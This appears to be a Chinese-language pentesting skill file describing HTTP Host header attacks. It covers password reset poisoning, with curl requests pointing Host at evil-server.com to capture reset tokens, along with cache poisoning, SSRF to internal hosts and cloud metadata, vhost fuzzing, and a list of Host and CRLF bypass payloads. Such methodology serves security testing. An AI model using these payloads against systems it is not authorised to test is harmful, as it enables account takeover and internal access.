---
name: http-host-header-attacks
description: "HTTP Host Header 攻击方法论。当目标存在密码重置、缓存机制、反向代理、虚拟主机、重定向功能时使用。覆盖密码重置投毒(Host注入窃取reset token)、Web缓存投毒(Host控制缓存键)、通过Host路由SSRF、虚拟主机枚举与跨站读取、绕过技术(X-Forwarded-Host/双Host/绝对URI/端口注入/换行符注入)。任何涉及密码重置、Host头处理、缓存、虚拟主机配置的测试都应使用此 skill"
metadata:
  tags: "host header,password reset poisoning,cache poisoning,SSRF,vhost,virtual host,密码重置投毒,缓存投毒,X-Forwarded-Host"
  category: "exploit"
---

# HTTP Host Header 攻击方法论

---

## 1. 核心概念

HTTP Host header 告诉 Web 服务器客户端请求的是哪个网站（虚拟主机路由）。很多应用在以下场景**信任 Host header 的值**：

- 生成密码重置链接
- 生成绝对 URL
- 缓存键计算
- 路由到内部后端
- 访问控制决策

如果应用**不验证 Host header**，攻击者可以操纵它来投毒链接、缓存或路由。

---

## 2. 密码重置投毒

### 原理

```
POST /forgot-password HTTP/1.1
Host: evil-server.com                    ← 攻击者替换
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

应用信任 Host 值生成重置链接 → 受害者收到的邮件中链接变为：
```
https://evil-server.com/reset?token=abc123
```

受害者点击链接 → token 发送到攻击者服务器。

### 检测

```bash
# 正常请求（记录原始链接格式）
curl -X POST https://target.com/forgot-password \
  -d "email=test@target.com"

# Host 注入
curl -X POST https://target.com/forgot-password \
  -H "Host: evil-server.com" \
  -d "email=victim@target.com"

# 检查邮件中的链接是否包含 evil-server.com
```

### 绕过变体

如果直接替换 Host 被拒绝（400/403）：

```http
# 1. X-Forwarded-Host（最常用）
Host: target.com
X-Forwarded-Host: evil-server.com

# 2. 端口注入
Host: target.com:@evil-server.com

# 3. 绝对 URI
GET https://target.com/forgot-password HTTP/1.1
Host: evil-server.com

# 4. 双 Host header
Host: target.com
Host: evil-server.com

# 5. 换行符注入
Host: target.com
 X-Forwarded-Host: evil-server.com
```

---

## 3. Web 缓存投毒（影响说明）

Host header 或 `X-Forwarded-Host` 注入可作为缓存投毒的输入向量——当响应内容受 Host 值影响且缓存键不包含该头时，被投毒的响应会分发给所有用户。检测到 Host 注入影响响应内容后，应进一步评估缓存投毒的完整利用链。

---

## 4. 通过 Host 路由的 SSRF

### 后端路由场景

反向代理根据 Host header 决定转发到哪个后端：

```http
GET / HTTP/1.1
Host: internal-admin.target.com    ← 内部虚拟主机

GET / HTTP/1.1
Host: 169.254.169.254              ← 云元数据
```

### Absolute URI 绕过

```http
GET https://target.com/ HTTP/1.1
Host: 169.254.169.254
```

某些代理使用 absolute URI 的 host 做 ACL 检查，但用 Host header 做路由。

---

## 5. 虚拟主机枚举

### 发现隐藏的内部站点

```bash
# 用 ffuf 枚举 vhost
ffuf -u https://target.com -H "Host: FUZZ.target.com" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs <default-size>

# 指定 IP 直接访问
curl -k https://10.0.0.1/ -H "Host: admin.target.com"
```

### 内部面板典型名称

```
admin, staging, dev, test, internal, api-internal, 
monitoring, grafana, jenkins, gitlab, kibana,
phpmyadmin, adminer, debug, console, management
```

---

## 6. 绕过技术（7 种）

### 6.1 X-Forwarded-Host

```http
Host: target.com
X-Forwarded-Host: evil.com
```

### 6.2 双 Host Header

```http
Host: target.com
Host: evil.com
```

不同中间件取第一个或最后一个 — 代理和后端不一致时产生绕过。

### 6.3 绝对 URI

```http
GET https://target.com/path HTTP/1.1
Host: evil.com
```

### 6.4 Host 端口注入

```http
Host: target.com:evil.com
Host: target.com:@evil.com
Host: target.com:80@evil.com
```

### 6.5 其他 Override Header

```http
X-Host: evil.com
X-Forwarded-Server: evil.com
X-HTTP-Host-Override: evil.com
Forwarded: host=evil.com
```

### 6.6 换行符 / CRLF 注入

```http
Host: target.com%0d%0aX-Forwarded-Host: evil.com
```

### 6.7 Tab / 空格

```http
Host: target.com	evil.com
Host: target.com evil.com
```

---

## 7. 框架特定行为

| 框架 | Host 处理 | 密码重置风险 |
|---|---|---|
| **Django** | 检查 `ALLOWED_HOSTS`，但 `X-Forwarded-Host` 不在检查范围 | 高 — `X-Forwarded-Host` 直接用于 `build_absolute_uri()` |
| **Rails** | `X-Forwarded-Host` 优先于 `Host` | 高 — 直接影响 `url_for` |
| **Laravel** | 信任 `X-Forwarded-*` 如果设置了 trusted proxies | 中 — 取决于配置 |
| **Spring** | `ForwardedHeaderFilter` 处理 `Forwarded` header | 中 — 取决于是否启用 |
| **Express/Node** | `req.hostname` 读取 `X-Forwarded-Host`（在 trust proxy 下） | 中 |
| **ASP.NET** | `X-Forwarded-Host` 不自动使用 | 低（除非显式配置） |

---

## 8. Connection State 攻击

HTTP/1.1 Keep-Alive 场景下，部分反向代理只在**第一个请求**验证 Host，后续请求复用连接：

```
请求 1: Host: target.com      → 代理验证通过，建立连接
请求 2: Host: internal.com    → 代理不再验证，直接转发 → 访问内部站点
```

---

## 9. 决策树

```
目标有 Host header 注入点？
├── 密码重置功能？
│   ├── 直接替换 Host → 检查邮件链接
│   ├── 403/400？→ X-Forwarded-Host / 双 Host / 端口注入
│   └── 邮件含恶意域名？→ 密码重置投毒成功
├── 有缓存（CDN/Varnish/Nginx）？
│   ├── Host/X-Forwarded-Host 影响响应内容？
│   ├── 响应是否被缓存（X-Cache: HIT）？
│   └── 两者都是？→ Web 缓存投毒
├── 反向代理后多个后端？
│   ├── 枚举 vhost（ffuf + Host fuzz）
│   ├── Host: 169.254.169.254 → 云元数据 SSRF
│   └── Host: internal-admin → 内部面板访问
├── Connection State
│   └── Keep-Alive 复用 → 第二请求切换 Host
└── 全部失败 → 尝试其他注入点或攻击面
```

## 深入参考

- HTTP 头部操纵高级技术（CRLF 注入/参数污染/Hop-by-Hop 滥用） → [references/host-header-exploitation.md](references/host-header-exploitation.md)
